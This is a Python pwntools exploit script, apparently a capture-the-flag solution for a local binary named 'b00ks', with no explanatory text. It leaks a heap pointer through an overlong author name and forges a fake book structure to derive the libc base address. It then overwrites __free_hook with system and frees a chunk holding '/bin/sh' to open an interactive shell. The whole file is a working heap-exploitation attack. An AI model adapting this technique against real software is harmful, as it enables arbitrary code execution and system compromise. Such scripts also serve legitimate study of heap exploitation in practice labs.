from pwn import *

p = process('./b00ks')
libc = ELF('libc.so')
context.log_level = 'debug'

p.recvuntil('Enter author name: ')
p.sendline('A'*32)

def createbook(name_size,name,description_size,description) :
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('name size: ')
    p.sendline(str(name_size))
    p.recvuntil('(Max 32 chars): ')
    p.sendline(name)
    p.recvuntil('description size: ')
    p.sendline(str(description_size))
    p.recvuntil('description: ')
    p.sendline(description)

def deletebook(book_id) :
    p.recvuntil('> ')
    p.sendline('2')
    p.sendlineafter('you want to delete: ',str(book_id))

def editbook(book_id,new_description) :
    p.recvuntil('> ')
    p.sendline('3')
    p.sendlineafter('id you want to edit: ',str(book_id))
    p.sendlineafter('new book description: ',new_description)

def printbook() :
    p.recvuntil('> ')
    p.sendline('4')

def changename() :
    p.recvuntil('> ')
    p.sendline('5')
    p.sendlineafter('ter author name: ','A'*32)

createbook(320,'book1',320,'book11')
#gdb.attach(p)
printbook()
p.recvuntil('Author: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
book1_struct_addr = p.recv(6)
book1_struct_addr = u64(book1_struct_addr.ljust(8,'\x00'))
print hex(book1_struct_addr)
book2_struct_addr = book1_struct_addr + 0x30

createbook(135168,'book2',135168,'book22')
payload = 'A'*0x90 + p64(0x1) + p64(book2_struct_addr + 8)
payload += p64(book2_struct_addr + 8) + p64(0x140)
editbook(1,payload)

changename()
printbook()
p.recvuntil('Name: ')
book2_name_addr = u64(p.recv(6).ljust(8,'\x00'))
#gdb.attach(p)

offset = 0x7ffff7fb8010 - 0x7ffff7a0d000
base_addr = book2_name_addr - offset
free_addr = libc.symbols['__free_hook'] + base_addr
system_addr = libc.symbols['system'] + base_addr
bin_addr = libc.search('/bin/sh').next() + base_addr
print hex(free_addr),hex(bin_addr),hex(system_addr)
#gdb.attach(p)

payload2 = p64(bin_addr) + p64(free_addr)
editbook(1,payload2)
#gdb.attach(p)
payload3 = p64(system_addr)
editbook(2,payload3)

#gdb.attach(p)
deletebook(2)

p.interactive()
